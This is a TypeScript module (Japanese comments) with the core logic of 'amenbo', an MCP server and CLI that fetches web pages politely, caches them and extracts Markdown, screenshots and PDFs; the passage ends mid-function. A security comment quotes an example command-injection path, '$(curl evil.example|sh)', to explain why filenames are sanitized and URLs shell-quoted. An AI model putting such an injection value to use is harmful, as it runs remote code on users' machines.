/**
 * core.ts — MCPサーバー(server.ts)とCLI(cli.ts)が共有するamenboのコアロジック。
 *
 * politeness/cacheのシングルトン、二段フェッチ・キャッシュ・品質判定を経た本文解決
 * (resolvePage)・スクリーンショット解決(resolveScreenshot)・PDF専用経路(handlePdfFetch)、
 * および各ツール(fetch/screenshot)のハンドラと応答フォーマッタをここに集約する。
 * server.tsはMCPツール登録とstdioトランスポート接続のみを、cli.tsは引数パースと
 * 標準出力/ファイル出力のみを担当し、いずれもこのモジュールをimportして利用する。
 */
import { readFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { computeScreenshotCacheKey, PageCache, type CacheEntry, type CacheStatus, type ScreenshotCacheStatus } from "./cache.js";
import { diffMarkdown, type SectionDiff } from "./diff.js";
import { AmenboError, SectionNotFoundError } from "./errors.js";
import { detectDataSources } from "./extract/dataSources.js";
import { extractMarkdown, type ExtractionMethod } from "./extract/markdown.js";
import { buildOutline, findSection, formatBreadcrumb, type OutlineResult } from "./extract/outline.js";
import { DEFAULT_PDF_MAX_BYTES, extractPdfText, looksLikePdf, markdownFromPdfText, renderPdfPages } from "./extract/pdf.js";
import { buildHandoffPreview } from "./extract/preview.js";
import { evaluateQuality } from "./extract/qualityScore.js";
import { closeBrowser } from "./fetcher/browser.js";
import { fetchPage, type FetchTier, type HandoffResult } from "./fetcher/index.js";
import { assertHttpScheme, httpGetBinary, resolveDefaultMaxBodyBytes } from "./fetcher/http.js";
import type { LinksResult } from "./links.js";
import { PolitenessManager } from "./politeness.js";
import { captureTiledScreenshot, DEFAULT_TILE_WIDTH } from "./screenshot.js";
import { computeBlockHashes, removeTemplateBlocks } from "./templateLearning.js";
import { paginateMarkdown, type PaginatedResult } from "./tokens.js";

/** N1: package.jsonのversionを読み込む(以前はここに"0.3.0"を直書きしておりpackage.json(0.1.0)と不整合だった)。 */
export function resolvePackageVersion(): string {
  const fallback = "0.0.0";
  try {
    const packageJsonPath = join(dirname(fileURLToPath(import.meta.url)), "..", "package.json");
    const parsed = JSON.parse(readFileSync(packageJsonPath, "utf-8")) as { version?: unknown };
    return typeof parsed.version === "string" ? parsed.version : fallback;
  } catch (error) {
    console.error("package.jsonからバージョンを読み込めませんでした:", error);
    return fallback;
  }
}

/** キャッシュTTL(ミリ秒)。運用/検証時の調整用に環境変数で上書きできる(既定はcache.tsの15分)。 */
export function resolveCacheTtlMs(): number | undefined {
  const raw = process.env.AMENBO_CACHE_TTL_MS;
  if (!raw) return undefined;
  const parsed = Number(raw);
  return Number.isFinite(parsed) && parsed > 0 ? parsed : undefined;
}

const cacheTtlMs = resolveCacheTtlMs();
// テスト用export(既存スタイルに合わせた最小のテスト可能化。code-reviewer指摘:
// politeness.guardの呼び出し回数をテストで検証するため、spyOn対象として参照できる必要がある)。
export const cache = new PageCache(cacheTtlMs !== undefined ? { ttlMs: cacheTtlMs } : {});
// CLI併設対応: ドメイン毎の直近リクエスト時刻をcache.ts(host_requestsテーブル)へ永続化し、
// MCPサーバー/CLIの複数プロセス間でレート制御状態を共有する(cacheをpolitenessより先に
// 生成する必要があるためこの順序)。
// code-reviewer指摘: MCPサーバー単体運用時(CLIを使わない場合)でも、このstore注入により
// waitTurn毎にSQLite I/O(host_requestsの読み取り+書き込み)が発生する。CLIとの
// プロセス間共有が不要な単一プロセス運用ではインメモリのlastRequestAtだけで十分だったところに、
// 常時わずかなディスクI/Oコストを払うトレードオフになる(node:sqliteも同期I/Oで
// 小さな1行read/writeのため実測上は無視できるレベルだが、"低負荷優先"の設計原則上は
// 意図的なトレードオフとして明記しておく)。
// レビュー指摘対応: robots.txtの取得結果もcache.ts(robots_cacheテーブル)へ永続化し、
// プロセス間で共有する(CLIバルク収集時にコマンド毎にrobots.txtを再取得する低負荷原則違反への対応)。
export const politeness = new PolitenessManager({
  store: {
    getLastRequestAt: (host) => cache.getHostLastRequestAt(host),
    setLastRequestAt: (host, at) => cache.setHostLastRequestAt(host, at),
  },
  robotsStore: {
    get: (origin) => cache.getRobotsCache(origin),
    set: (origin, body, fetchedAt) => cache.setRobotsCache(origin, body, fetchedAt),
  },
});

// M2: cache.close()は同期処理なので'exit'イベント(非同期処理を待てない)内でも安全に呼べる。
// 一方でSIGINT/SIGTERMはブラウザのクリーンアップ(非同期)を待ってから明示的にprocess.exit()する
// 必要がある(fetcher/browser.tsのregisterCleanupHandlersと同様の理由。あちらは
// getBrowser()が一度も呼ばれない=chromium未起動のセッションではリスナー登録自体が行われない
// ため、ここでサーバー起点の終了処理として独立して登録しておく)。
//
// レビュー指摘対応(Medium): 以前はこの登録をモジュールトップレベルで即時実行していたため、
// core.tsをimportするだけの全テスト(vitestワーカープロセス)にもSIGINT/SIGTERMハンドラ
// (closeBrowser().finally(() => process.exit(0)))が仕込まれてしまい、テスト中断時にvitestの
// クリーンアップより先にprocess.exit(0)を呼びうる副作用があった。登録処理を関数へ切り出し、
// MCPサーバー起動経路(server.ts runServer())からのみ呼ぶことで、importするだけでは
// ホストプロセスに影響しないようにする。CLI(cli.ts)はrun()のfinallyでclosBrowser/cache.close済み
// のため、この登録は不要(サーバー常駐プロセスのみが対象)。
let coreShutdownHandlersRegistered = false;

/** サーバー常駐プロセス向けの終了処理(exit/SIGINT/SIGTERM)を登録する。多重登録は行わない(冪等)。 */
export function registerCoreShutdownHandlers(): void {
  if (coreShutdownHandlersRegistered) return;
  coreShutdownHandlersRegistered = true;
  process.once("exit", () => {
    cache.close();
  });
  process.once("SIGINT", () => {
    void closeBrowser().finally(() => process.exit(0));
  });
  process.once("SIGTERM", () => {
    void closeBrowser().finally(() => process.exit(0));
  });
}

const DEFAULT_MAX_TOKENS = 8000;
const DEFAULT_PAGE = 1;
const DEFAULT_SCREENSHOT_SCALE = 1.0;

/** URLのhostnameを安全に取り出す(不正URLならnull)。Phase 4テンプレート学習のドメインキーに使う。 */
function safeHostname(url: string): string | null {
  try {
    return new URL(url).hostname;
  } catch {
    return null;
  }
}

type ExtendedFetchTier = FetchTier | "cache";

/** サーバー側が304を受け取ったがキャッシュが存在しない、という到達しないはずの異常系。 */
class UnexpectedNotModifiedError extends AmenboError {
  readonly code = "UNEXPECTED_NOT_MODIFIED";
  constructor(url: string) {
    super(`キャッシュが存在しないのにNot Modified(304)が返されました: ${url}`);
  }
}

interface ExtractedPage {
  status: "fetched";
  markdown: string;
  title: string | null;
  finalUrl: string;
  tier: FetchTier;
  etag: string | null;
  lastModified: string | null;
  lowQuality: boolean;
  qualityReason: string | null;
  prunedBlockCount: number;
  adapterName: string | null;
  extractionMethod: ExtractionMethod;
  /** 機能C: ページ内の構造化データリンクから作った最大5件のヒント行(検出ゼロなら空配列)。 */
  dataSourceHints: string[];
}

type FetchAndExtractResult = { status: "not_modified" } | { status: "handoff"; handoff: HandoffResult } | ExtractedPage;

/** URLとselectorの組から、新規取得・変換したMarkdownと品質スコア/pruning/アダプタ/ジオメトリ結果を作る。 */
async function fetchAndExtract(
  url: string,
  selector: string | undefined,
  conditionalHeaders: Record<string, string> | undefined,
  onProgress?: ((message: string) => void) | undefined,
): Promise<FetchAndExtractResult> {
  // レビュー指摘対応: リダイレクトで別オリジンへ着地した場合、その着地先のrobots.txtも
  // 確認する(guardedFetch内で着地先オリジンが変わった場合のみ呼ばれる。同一オリジン内
  // リダイレクトや初回URLは呼び出し元のpoliteness.guardで確認済みのため二重チェックしない)。
  const checkRobots = (targetUrl: string) => politeness.checkRobotsAllowed(targetUrl);
  const fetchResult = await fetchPage(url, conditionalHeaders ? { headers: conditionalHeaders, onProgress, checkRobots } : { onProgress, checkRobots });
  if ("notModified" in fetchResult) {
    return { status: "not_modified" };
  }
  // 機能B: HTML/PDF以外のコンテンツはハンドオフ応答(メタデータ+プレビュー+curl誘導)の対象。
  // Markdown抽出・品質判定・キャッシュ保存は行わない。
  if ("handoff" in fetchResult) {
    return { status: "handoff", handoff: fetchResult };
  }

  let extracted = extractMarkdown(fetchResult.html, {
    url: fetchResult.finalUrl,
    ...(selector ? { selector } : {}),
    geometry: fetchResult.geometry,
  });
  let finalFetchResult = fetchResult;

  // Phase 4 ジオメトリ抽出: HTTP tierでReadability/アダプタ双方が失敗した(body-fallback)場合、
  // 二段フェッチのSPA判定に該当しなくても、ジオメトリ(bounding box)を得る目的だけで
  // ブラウザへ再エスカレーションする。div soup/テーブルレイアウトの古い個人/中小企業サイト
  // 対策の本命(plan.md §6 Phase4)。selector指定時はユーザーが本文位置を明示済みなので行わない。
  // ジオメトリでも改善しなかった場合はHTTP tierの結果(body-fallback)をそのまま使う。
  if (!selector && fetchResult.tier === "http" && extracted.extractionMethod === "body-fallback") {
    try {
      await politeness.waitTurn(url, onProgress); // 追加のブラウザ遷移が発生するため、律速のため再度順番を待つ
      const browserFetchResult = await fetchPage(url, { forceBrowser: true, onProgress, checkRobots });
      if (!("notModified" in browserFetchResult) && !("handoff" in browserFetchResult)) {
        const browserExtracted = extractMarkdown(browserFetchResult.html, { url: browserFetchResult.finalUrl, geometry: browserFetchResult.geometry });
        if (browserExtracted.extractionMethod === "geometry") {
          extracted = browserExtracted;
          finalFetchResult = browserFetchResult;
        }
      }
    } catch {
      // 再エスカレーションに失敗してもHTTP tierの結果(body-fallback)をそのまま使う(ベストエフォート)
    }
  }

  const quality = evaluateQuality(extracted.qualityInput);

  // 機能C: 最終的に採用したfetch結果(HTTP tier、またはジオメトリ再エスカレーション成功時は
  // browser tier)のHTMLからページ内の構造化データリンクを検出する。screenshotモードへの
  // 自動切替(mode:auto)はこの後server.ts側で判定されるため、ここでは常に計算しておき
  // (検出ゼロならトークン増ゼロ)、screenshot応答側では単に参照しない。
  const dataSourceHints = detectDataSources(finalFetchResult.html, finalFetchResult.finalUrl);

  return {
    status: "fetched",
    markdown: extracted.markdown,
    title: extracted.title,
    finalUrl: finalFetchResult.finalUrl,
    tier: finalFetchResult.tier,
    etag: finalFetchResult.etag,
    lastModified: finalFetchResult.lastModified,
    lowQuality: quality.lowQuality,
    qualityReason: quality.reason,
    prunedBlockCount: extracted.prunedBlockCount,
    adapterName: extracted.adapterName,
    extractionMethod: extracted.extractionMethod,
    dataSourceHints,
  };
}

interface ResolvedPage {
  title: string | null;
  finalUrl: string;
  tier: ExtendedFetchTier;
  cacheStatus: CacheStatus;
  markdown: string;
  lowQuality: boolean;
  qualityReason: string | null;
  prunedBlockCount: number;
  adapterName: string | null;
  extractionMethod: ExtractionMethod;
  /** 新規フェッチ(cacheStatus==='miss')の場合のみ、上書き前の旧キャッシュ内容(§3-3差分応答用)。 */
  previousMarkdown: string | null;
  /** 機能C: ページ内の構造化データリンクから作った最大5件のヒント行(検出ゼロなら空配列)。 */
  dataSourceHints: string[];
}

/** 機能B: 非HTMLコンテンツはMarkdown化・キャッシュ対象外のため、ResolvedPageとは別枝で扱う。 */
type ResolvePageResult = ResolvedPage | { kind: "handoff"; handoff: HandoffResult };

function pageFromCacheEntry(url: string, cached: ReturnType<PageCache["get"]>, cacheStatus: CacheStatus): ResolvedPage {
  const metadata = cached?.metadata ?? {};
  const dataSourceHints = Array.isArray(metadata.dataSourceHints) ? (metadata.dataSourceHints as string[]) : [];
  return {
    title: (metadata.title as string | null) ?? null,
    finalUrl: (metadata.finalUrl as string | undefined) ?? url,
    tier: "cache",
    cacheStatus,
    markdown: cached?.markdown ?? "",
    lowQuality: Boolean(metadata.lowQuality),
    qualityReason: (metadata.qualityReason as string | null) ?? null,
    prunedBlockCount: Number(metadata.prunedBlockCount ?? 0),
    adapterName: (metadata.adapterName as string | null) ?? null,
    extractionMethod: (metadata.extractionMethod as ExtractionMethod | undefined) ?? "readability",
    previousMarkdown: null,
    dataSourceHints,
  };
}

/**
 * URL(+selector)からMarkdownを解決する。selector指定時はURL単位のキャッシュを使わない
 * (同一URLでも抽出結果がselector毎に変わるため)。品質スコア/アダプタ判定結果もキャッシュ
 * メタデータへ保存し、'fresh'なキャッシュ応答時にも再フェッチ無しでmode:autoの判定を再現する。
 * 機能B: 非HTMLコンテンツ(ハンドオフ対象)を取得した場合は { kind: "handoff" } を返す。
 *
 * レビュー指摘対応: politeness.guard(robots.txt確認+レート制御待機)は「実際にサイトへ
 * 取得しに行く」直前でのみ呼ぶ。キャッシュfresh応答時は実ネットワークアクセスが発生しない
 * ため、outline→sectionの推奨フロー等でキャッシュヒットするたびに待機・robots再判定という
 * 自己ペナルティが発生していた不具合の修正。selector指定時は必ずfetchするため常にguardする。
 */
async function resolvePage(
  url: string,
  selector: string | undefined,
  onProgress?: ((message: string) => void) | undefined,
): Promise<ResolvePageResult> {
  if (selector) {
    await politeness.guard(url, onProgress);
    const result = await fetchAndExtract(url, selector, undefined, onProgress);
    if (result.status === "not_modified") {
      throw new UnexpectedNotModifiedError(url);
    }
    if (result.status === "handoff") {
      return { kind: "handoff", handoff: result.handoff };
    }
    return {
      title: result.title,
      finalUrl: result.finalUrl,
      tier: result.tier,
      cacheStatus: "miss",
      markdown: result.markdown,
      lowQuality: result.lowQuality,
      qualityReason: result.qualityReason,
      prunedBlockCount: result.prunedBlockCount,
      adapterName: result.adapterName,
      extractionMethod: result.extractionMethod,
      previousMarkdown: null,
      dataSourceHints: result.dataSourceHints,
    };
  }

  const cached = cache.get(url);
  if (cached && cache.isFresh(cached)) {
    return pageFromCacheEntry(url, cached, "fresh");
  }

  // 条件付きGET(304)も含め実際にサーバーへ通信するため、ここでguardする
  // (キャッシュfresh応答で早期returnした場合はguardしない=上のコメント参照)。
  await politeness.guard(url, onProgress);

  const conditionalHeaders: Record<string, string> = {};
  if (cached?.etag) conditionalHeaders["If-None-Match"] = cached.etag;
  if (cached?.lastModified) conditionalHeaders["If-Modified-Since"] = cached.lastModified;

  const result = await fetchAndExtract(
    url,
    undefined,
    Object.keys(conditionalHeaders).length > 0 ? conditionalHeaders : undefined,
    onProgress,
  );

  if (result.status === "not_modified") {
    if (!cached) throw new UnexpectedNotModifiedError(url);
    cache.touch(url);
    return pageFromCacheEntry(url, cached, "revalidated");
  }

  if (result.status === "handoff") {
    return { kind: "handoff", handoff: result.handoff };
  }

  const previousMarkdown = cached?.markdown ?? null;

  // Phase 4 テンプレート学習: このページの(除去前・全)ブロックハッシュをドメイン別に記録する。
  // selector指定時(このブランチには来ない)は記録しない(選択範囲が偏り学習を汚すため)。
  const domain = safeHostname(result.finalUrl);
  if (domain) {
    cache.recordDomainPageBlocks(domain, url, computeBlockHashes(result.markdown));
  }

  cache.set({
    url,
    etag: result.etag,
    lastModified: result.lastModified,
    markdown: result.markdown,
    metadata: {
      title: result.title,
      finalUrl: result.finalUrl,
      tier: result.tier,
      lowQuality: result.lowQuality,
      qualityReason: result.qualityReason,
      prunedBlockCount: result.prunedBlockCount,
      adapterName: result.adapterName,
      extractionMethod: result.extractionMethod,
      dataSourceHints: result.dataSourceHints,
    },
  });

  return {
    title: result.title,
    finalUrl: result.finalUrl,
    tier: result.tier,
    cacheStatus: "miss",
    markdown: result.markdown,
    lowQuality: result.lowQuality,
    qualityReason: result.qualityReason,
    prunedBlockCount: result.prunedBlockCount,
    adapterName: result.adapterName,
    extractionMethod: result.extractionMethod,
    previousMarkdown,
    dataSourceHints: result.dataSourceHints,
  };
}

// ---- スクリーンショット解決(fetch toolのscreenshot自動切替/screenshotツール共通) ----

interface ScreenshotTileData {
  data: Buffer;
}

interface ResolvedScreenshot {
  finalUrl: string;
  tiles: ScreenshotTileData[];
  cacheStatus: ScreenshotCacheStatus;
  pageWidth: number;
  pageHeight: number;
  /** N7: MAX_TILES切り捨てが発生していた場合true。 */
  truncated: boolean;
}

interface ResolveScreenshotOptions {
  fullPage: boolean;
  width: number;
  scale: number;
  /** MCP progress notifications用。politeness待機発生時・撮影開始時に呼ばれる。 */
  onProgress?: ((message: string) => void) | undefined;
}

/**
 * M4: キャッシュ済みタイルのPNGファイルが(手動削除・M3のTTL掃除の競合等で)欠損している場合、
 * 生のENOENTを伝播させず null を返してcache miss扱い(再撮影)へフォールバックする。
 */
function readCachedTiles(tilePaths: string[]): ScreenshotTileData[] | null {
  try {
    return tilePaths.map((filePath) => ({ data: readFileSync(filePath) }));
  } catch (error) {
    const isEnoent = error instanceof Error && "code" in error && (error as NodeJS.ErrnoException).code === "ENOENT";
    if (isEnoent) return null;
    throw error;
  }
}

async function resolveScreenshot(url: string, options: ResolveScreenshotOptions): Promise<ResolvedScreenshot> {
  // 公開品質バグ修正: robots.txt取得(politeness.guard)やブラウザ起動より前にスキームを検証する。
  // file:等を先に弾かないと、politeness側が origin("null"等)からrobots URLを組み立てる際に
  // 壊れたURLになり、生のTypeErrorがstderrに漏れてしまう(guardPublicAddress自体は
  // このあとcaptureTiledScreenshot内のnavigateSafelyでも検証するが、それより前段で
  // クリーンな型付きエラーとして早期に弾く)。
  assertHttpScheme(url);

  const cacheKey = computeScreenshotCacheKey(url, options.width, options.scale, options.fullPage);
  const cached = cache.getScreenshot(cacheKey);
  if (cached && cache.isFresh(cached)) {
    const tiles = readCachedTiles(cached.tilePaths);
    if (tiles) {
      // レビュー指摘対応(#4と同型): キャッシュ済みタイルを返すだけならサイトへ取得しに行かない
      // ため、guard(robots確認+レート制御待機)を行わない。実撮影に進む場合のみ下でguardする。
      return {
        finalUrl: cached.url,
        tiles,
        cacheStatus: "fresh",
        pageWidth: Number(cached.metadata.pageWidth ?? 0),
        pageHeight: Number(cached.metadata.pageHeight ?? 0),
        truncated: Boolean(cached.metadata.truncated),
      };
    }
    // PNGファイル欠損: キャッシュmiss扱いで下の再撮影へフォールスルーする
  }

  // レビュー指摘対応: 実URLへの独立したブラウザ遷移が発生する直前でguardする(markdown取得時の
  // guardとは別枠。handleFetchTool冒頭の共通guardは撤去済み)。キャッシュfresh返却時は通らない。
  await politeness.guard(url, options.onProgress);
  options.onProgress?.("スクリーンショットを撮影しています…");
  const captured = await captureTiledScreenshot(url, options);
  cache.setScreenshot({
    cacheKey,
    url: captured.finalUrl,
    tiles: captured.tiles.map((tile) => tile.png),
    metadata: { pageWidth: captured.pageWidth, pageHeight: captured.pageHeight, truncated: captured.truncated },
  });

  return {
    finalUrl: captured.finalUrl,
    tiles: captured.tiles.map((tile) => ({ data: tile.png })),
    cacheStatus: "miss",
    pageWidth: captured.pageWidth,
    pageHeight: captured.pageHeight,
    truncated: captured.truncated,
  };
}

// ---- 応答フォーマット ----

export type TextBlock = { type: "text"; text: string };
export type ImageBlock = { type: "image"; data: string; mimeType: string };

function adapterLine(adapterName: string | null): string[] {
  return adapterName ? [`adapter: ${adapterName}`] : [];
}

/**
 * 抽出経路の注記。"readability"(既定の成功経路)/"adapter"(adapter:行と重複するため省略)/
 * "selector"(ユーザー指定なので自明)は表示せず、Phase 4の "geometry" と、
 * 品質が疑わしい "body-fallback" のみユーザーへ明示する(トークン節約)。
 */
function extractionMethodLine(method: ExtractionMethod): string[] {
  return method === "geometry" || method === "body-fallback" ? [`extraction: ${method}`] : [];
}

/** Phase 4: テンプレート学習で除去した定型ブロック数(0件なら表示しない。トークン節約)。 */
function templateRemovedLine(templateRemovedCount: number): string[] {
  return templateRemovedCount > 0 ? [`template_blocks_removed: ${templateRemovedCount}`] : [];
}

/** N6: 単一ブロックがmax_tokens予算を超過し、分割できずそのまま返した場合のみ明示する。 */
function budgetExceededLine(paginated: PaginatedResult): string[] {
  return paginated.exceededBudget ? [`budget_exceeded: true(単一ブロックがmax_tokensを超過しています)`] : [];
}

/** 機能C: 構造化データリンクのヒント(検出ゼロなら空文字=トークン増ゼロ)。 */
export function dataSourcesSection(hints: string[]): string {
  return hints.length > 0 ? `\n\ndata_sources:\n${hints.join("\n")}` : "";
}

function formatMarkdownResponse(
  page: ResolvedPage,
  paginated: PaginatedResult,
  sectionId: string | null,
  templateRemovedCount: number,
  breadcrumb: string | null = null,
): string {
  const header = [
    `title: ${page.title ?? "(なし)"}`,
    `url: ${page.finalUrl}`,
    `mode_used: markdown`,
    ...(sectionId ? [`section: ${sectionId}`] : []),
    // leaf節を単独取得したとき、この節が属する上位見出しの連なりを補い文脈喪失を防ぐ。
    ...(breadcrumb ? [`section_path: ${breadcrumb}`] : []),
    `cache: ${page.cacheStatus}`,
    `tokens: ${paginated.tokens}`,
    `page: ${paginated.page} of ${paginated.totalPages}`,
    `fetch_tier: ${page.tier}`,
    `pruned_blocks: ${page.prunedBlockCount}`,
    ...adapterLine(page.adapterName),
    ...extractionMethodLine(page.extractionMethod),
    ...templateRemovedLine(templateRemovedCount),
    ...budgetExceededLine(paginated),
  ].join("\n");
  return `${header}\n\n${paginated.content}${dataSourcesSection(page.dataSourceHints)}`;
}

/** §3-3 差分応答: 本文ハッシュ一致(約10トークンの短文応答)。 */
function formatUnchangedResponse(page: ResolvedPage): string {
  return [`url: ${page.finalUrl}`, `mode_used: markdown`, `cache: unchanged`].join("\n");
}

function formatSectionDiffBlock(diff: SectionDiff): string {
  const label = diff.type === "added" ? "追加" : diff.type === "removed" ? "削除" : "変更";
  if (diff.type === "removed") {
    return `${"#".repeat(diff.level)} ${diff.heading} [${label}]`;
  }
  const lines = diff.content.split("\n");
  if (lines.length > 0 && /^#{1,6}\s/.test(lines[0] ?? "")) {
    lines[0] = `${lines[0]} [${label}]`;
    return lines.join("\n");
  }
  return `${"#".repeat(diff.level)} ${diff.heading} [${label}]\n\n${diff.content}`;
}

/** §3-3 差分応答: 変更・追加・削除された節のみ返却。 */
function formatDiffResponse(page: ResolvedPage, sections: SectionDiff[], templateRemovedCount: number): string {
  const counts = { added: 0, changed: 0, removed: 0 };
  for (const section of sections) counts[section.type]++;

  const header = [
    `title: ${page.title ?? "(なし)"}`,
    `url: ${page.finalUrl}`,
    `mode_used: markdown`,
    `cache: diff`,
    `changed_sections: ${sections.length}(追加${counts.added}/変更${counts.changed}/削除${counts.removed})`,
    `fetch_tier: ${page.tier}`,
    ...adapterLine(page.adapterName),
    ...extractionMethodLine(page.extractionMethod),
    ...templateRemovedLine(templateRemovedCount),
  ].join("\n");

  return `${header}\n\n${sections.map(formatSectionDiffBlock).join("\n\n")}${dataSourcesSection(page.dataSourceHints)}`;
}

function formatOutlineResponse(page: ResolvedPage, outline: OutlineResult, templateRemovedCount: number): string {
  const header = [
    `title: ${page.title ?? "(なし)"}`,
    `url: ${page.finalUrl}`,
    `mode_used: outline`,
    `cache: ${page.cacheStatus}`,
    `total_tokens: ${outline.totalTokens}`,
    `fetch_tier: ${page.tier}`,
    ...adapterLine(page.adapterName),
    ...extractionMethodLine(page.extractionMethod),
    ...templateRemovedLine(templateRemovedCount),
  ].join("\n");

  const body =
    outline.sections
      .map((section) => `${"  ".repeat(section.level - 1)}- [${section.id}] ${"#".repeat(section.level)} ${section.heading} — ${section.excerpt} (~${section.tokens} tok)`)
      .join("\n") || "(見出しが見つかりませんでした。mode: markdown で全文を取得してください)";

  return `${header}\n\n${body}`;
}

export function buildScreenshotContent(
  page: { title: string | null },
  screenshot: ResolvedScreenshot,
  reason: string | null,
): Array<TextBlock | ImageBlock> {
  const header = [
    `title: ${page.title ?? "(なし)"}`,
    `url: ${screenshot.finalUrl}`,
    `mode_used: screenshot`,
    `cache: ${screenshot.cacheStatus}`,
    `reason: ${reason ?? "明示的にscreenshotが指定されました"}`,
    `tiles: ${screenshot.tiles.length}`,
    `page_size: ${screenshot.pageWidth}x${screenshot.pageHeight}`,
    `fetch_tier: browser`,
    // N7: MAX_TILES切り捨てが発生した場合のみ明示する(トークン節約)
    ...(screenshot.truncated ? [`truncated: true(MAX_TILES枚を超えるため切り捨てました)`] : []),
  ].join("\n");

  return [
    { type: "text", text: header },
    ...screenshot.tiles.map((tile) => ({ type: "image" as const, data: tile.data.toString("base64"), mimeType: "image/png" })),
  ];
}

export function formatLinksResponse(url: string, result: LinksResult): string {
  const header = [`url: ${url}`, `source: ${result.source}`, `count: ${result.links.length}${result.truncated ? " (truncated)" : ""}`].join("\n");
  const body = result.links.map((link) => (link.title ? `- ${link.title} — ${link.url}` : `- ${link.url}`)).join("\n");
  // レビュー指摘対応: 0件のとき、フィルタで全部落ちたのか(preFilterCount>0)、
  // sitemap/RSS/ページ自体が空だったのか(preFilterCount===0)をエージェントが判別できるようにする。
  // filter未指定時はpreFilterCount===links.lengthのためこの分岐には入らない。
  const empty =
    result.preFilterCount > 0
      ? `(リンクが見つかりませんでした。フィルタ前 ${result.preFilterCount} 件。filterに一致しませんでした)`
      : "(リンクが見つかりませんでした)";
  return `${header}\n\n${body || empty}`;
}

// ---- 機能B: 非HTMLコンテンツのハンドオフ応答 ----

/**
 * URLのパス末尾からファイル名を推測する(curl -o のデフォルト値用)。取れなければ"download"。
 *
 * セキュリティ修正(CWE-78): WHATWG URLパーサは `'` `;` `|` `$` `` ` `` 等のパス中の文字を
 * パーセントエンコードしないため、攻撃者が細工したURL(例: `/$(curl evil.example|sh).csv`)経由で
 * このファイル名がそのままシェルコマンド文字列(hint行)に混入し、コマンドインジェクションが
 * 成立しうる。curlに渡す提案コマンドの一部として安全に提示できるよう、英数字・`.`・`-`・`_`
 * 以外は全て `_` に置換する。
 */
export function guessFilename(url: string): string {
  const rawBase = (() => {
    try {
      const pathname = new URL(url).pathname;
      return pathname.split("/").filter((segment) => segment.length > 0).pop() ?? "";
    } catch {
      return "";
    }
  })();
  const sanitized = rawBase.replace(/[^A-Za-z0-9._-]/g, "_");
  return sanitized.length > 0 ? sanitized : "download";
}

/**
 * シェルの単一引用符コンテキストへ値を安全に埋め込む(CWE-78対策)。
 * 単一引用符内では `'` 以外は解釈されないため、`'` のみ「引用符を閉じ、
 * エスケープ済み`'`を1つ挿入し、再び引用符を開く」(`'\''`)という定石で表現する。
 */
export function shellQuoteSingle(value: string): string {
  return `'${value.replace(/'/g, `'\\''`)}'`;
}

/**
 * 機能B: HTML/PDF以外のコンテンツタイプを「行き止まり」のエラーではなく、
 * メタデータ+プレビュー+curl誘導の正常応答として整形する。
 * ファイル全体がAMENBO_MAX_BODY_BYTESを超える場合(Content-Length既知時)は
 * プレビュー自体を省略し、メタデータ+誘導のみを返す。
 */
export function formatHandoffResponse(handoff: HandoffResult, maxTokens: number): string {
  const filename = guessFilename(handoff.finalUrl);
  const sizeKnown = handoff.declaredSize !== null;
  const sizeLabel = sizeKnown ? `${handoff.declaredSize}` : `${handoff.bytes.length}(取得分。Content-Lengthヘッダ無し)`;
  const oversized = sizeKnown && (handoff.declaredSize as number) > resolveDefaultMaxBodyBytes();

  const header = [
    `content_type: ${handoff.contentType ?? "(不明)"}`,
    `size: ${sizeLabel}`,
    `url: ${handoff.finalUrl}`,
    `mode_used: handoff`,
  ].join("\n");

  const preview = oversized ? null : buildHandoffPreview(handoff.bytes, handoff.contentType, maxTokens, handoff.truncated);
  const previewBlock = preview ? `\n\n${preview.body}${preview.note ? `\n\n(${preview.note})` : ""}` : "";

  const hint = `\n\nhint: このファイルはamenboの本文抽出対象外です。全体の取得は curl -L -o ${filename} ${shellQuoteSingle(handoff.finalUrl)} を推奨します`;

  return `${header}${previewBlock}${hint}`;
}

// ---- PDF対応(URL判定で独立経路。mode/selector/section等は適用しない) ----

function formatPdfTextResponse(title: string | null, finalUrl: string, cacheStatus: "fresh" | "miss", pdfPageCount: number, paginated: PaginatedResult): string {
  const header = [
    `title: ${title ?? "(なし)"}`,
    `url: ${finalUrl}`,
    `mode_used: markdown`,
    `cache: ${cacheStatus}`,
    `tokens: ${paginated.tokens}`,
    `page: ${paginated.page} of ${paginated.totalPages}`,
    `fetch_tier: pdf`,
    `pdf_pages: ${pdfPageCount}`,
    ...budgetExceededLine(paginated),
  ].join("\n");
  return `${header}\n\n${paginated.content}`;
}

/** キャッシュ済みPDFエントリからテキスト応答を組み立てる(fresh応答/304再検証後の応答で共用)。 */
function formatPdfResponseFromCache(url: string, cached: CacheEntry, maxTokens: number, page: number): string {
  const paginated = paginateMarkdown(cached.markdown, maxTokens, page);
  const title = (cached.metadata.title as string | null) ?? null;
  const finalUrl = (cached.metadata.finalUrl as string | undefined) ?? url;
  const pdfPageCount = Number(cached.metadata.pdfPageCount ?? 0);
  return formatPdfTextResponse(title, finalUrl, "fresh", pdfPageCount, paginated);
}

/** PDFはキャッシュ層(§3-3等)を流用しつつ独立した経路で扱う。テキスト層があればMarkdown、無ければ画像タイル。 */
async function handlePdfFetch(
  url: string,
  page: number,
  maxTokens: number,
  onProgress?: ((message: string) => void) | undefined,
): Promise<Array<TextBlock | ImageBlock>> {
  const cached = cache.get(url);
  if (cached && cache.isFresh(cached)) {
    return [{ type: "text", text: formatPdfResponseFromCache(url, cached, maxTokens, page) }];
  }

  // レビュー指摘対応: キャッシュfresh応答時は実ネットワークアクセスが発生しないため
  // guardしない(resolvePageと同じ方針)。実際にPDFを取得しに行く直前でのみguardする。
  await politeness.guard(url, onProgress);

  // 低負荷原則対応: TTL失効後もキャッシュ(etag/last-modified)があれば条件付きGETで再検証する。
  // HTML経路(resolvePage)は既にこの流儀で304時のフルDL+再パースを回避しているのに対し、
  // PDF経路はTTL失効後は常にフルDL+全ページ再パースを行っており、20MB級の官公庁PDFで
  // 内容不変でも毎回無駄なコストを払っていた不整合の修正。
  const conditionalHeaders: Record<string, string> = {};
  if (cached?.etag) conditionalHeaders["If-None-Match"] = cached.etag;
  if (cached?.lastModified) conditionalHeaders["If-Modified-Since"] = cached.lastModified;

  const binary = await httpGetBinary(url, {
    maxBytes: DEFAULT_PDF_MAX_BYTES,
    checkRobots: (targetUrl) => politeness.checkRobotsAllowed(targetUrl),
    ...(Object.keys(conditionalHeaders).length > 0 ? { headers: conditionalHeaders } : {}),
  });

  if (binary.status === 304) {
    if (!cached) throw new UnexpectedNotModifiedError(url);
    cache.touch(url);
    // PDF応答フォーマットのcacheStatus型は"fresh"|"miss"のみのため、304再検証も
